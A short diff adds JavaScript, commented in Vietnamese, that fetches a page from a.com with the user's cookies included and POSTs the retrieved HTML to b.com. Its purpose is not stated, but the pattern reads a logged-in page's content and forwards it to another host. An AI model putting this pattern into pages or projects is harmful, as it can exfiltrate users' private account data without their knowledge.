@@ -1,0 +1,33 @@
+// Lấy toàn bộ HTML từ a.com với credentials (cookie) được gửi kèm
+fetch('https://a.com', {
+  method: 'GET',
+  credentials: 'include' // Gửi cookie, cần thiết khi a.com sử dụng SameSite=None
+})
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`Lỗi khi fetch: ${response.status}`);
+    }
+    return response.text(); // Chuyển đổi phản hồi thành chuỗi HTML
+  })
+  .then(htmlContent => {
+    // Gửi HTML vừa lấy được qua POST lên trang B
+    return fetch('https://b.com', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json' // Hoặc thay đổi theo định dạng bạn muốn gửi
+      },
+      body: JSON.stringify({ html: htmlContent })
+    });
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`Lỗi khi POST: ${response.status}`);
+    }
+    return response.json(); // Nếu trang B trả về JSON
+  })
+  .then(data => {
+    console.log('Dữ liệu nhận được từ B:', data);
+  })
+  .catch(error => {
+    console.error('Có lỗi xảy ra:', error);
+  });
